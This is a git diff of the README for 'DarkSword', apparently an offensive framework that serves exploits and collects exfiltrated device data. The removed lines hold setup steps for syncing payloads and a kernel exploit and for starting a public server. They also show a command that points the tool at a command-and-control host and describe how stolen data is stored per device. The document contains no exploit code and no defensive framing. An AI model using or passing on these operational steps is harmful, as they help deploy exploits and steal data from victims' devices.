@@ -106,71 +106,8 @@ DarkSword/
 
 ## Quick Start
 
-### Requirements
-
-- Python >= 3.9
-- Supported OS: Windows / Linux / macOS
-
-### Installation & Deployment
-
-```bash
-# 1. Enter project directory
-cd darksword-main
-
-# 2. Create virtual environment
-python3.9 -m venv venv
-
-# 3. Activate virtual environment
-# Linux/Mac:
-source venv/bin/activate
-# Windows:
-.\venv\Scripts\activate
-
-# 4. Install project
-pip install -e .
-
-# 5. Sync payloads
-darksword sync
-
-# 6. Download kernel exploit
-darksword sync-kexploit
-
-# 7. Start server
-darksword serve -H 0.0.0.0 -p 8080
-```
-
-### CLI Commands
-
-| Command                            | Description              |
-| ---------------------------------- | ------------------------ |
-| `darksword serve`                  | Start HTTP server        |
-| `darksword sync`                   | Sync payloads            |
-| `darksword sync-kexploit`          | Sync kernel exploit      |
-| `darksword list`                   | List available payloads  |
-| `darksword info`                   | Display exploit info     |
-| `darksword template generate`      | Generate custom landing  |
-
-### Server Options
-
-```bash
-darksword serve -H 0.0.0.0 -p 8080
-darksword serve -p 8443 --c2-host http://your-c2.com
-```
-
-- `-H, --host`: Listen address
-- `-p, --port`: Port
-- `--c2-host`: Custom C2 address
-- `--redirect`: Fallback redirect URL
-
-## Data Storage
-
-Exfiltrated data is automatically saved to:
-
-```
-darksword-main/exfil/
-```
-
-Save format: `{device}_{category}_{timestamp}.bin/txt`
+Test Client
+![Dashboard](zhanshi/sb/sb0001.png)
 
 ## Interface Display
 
@@ -194,19 +131,9 @@ Save format: `{device}_{category}_{timestamp}.bin/txt`
 
 ![Function Menu](zhanshi/005.jpg)
 
-### Feature Demonstration
+### Device Support
 
 ![Demo 1](zhanshi/sb/sb.png)
-
-![Demo 2](zhanshi/sb/sb01.png)
-
-![Demo 3](zhanshi/sb/sb02.png)
-
-![Demo 4](zhanshi/sb/sb003.png)
-
-![Demo 5](zhanshi/sb/sb04.png)
-
-![Demo 6](zhanshi/sb/sb05.png)
 
 ## Use Cases
 
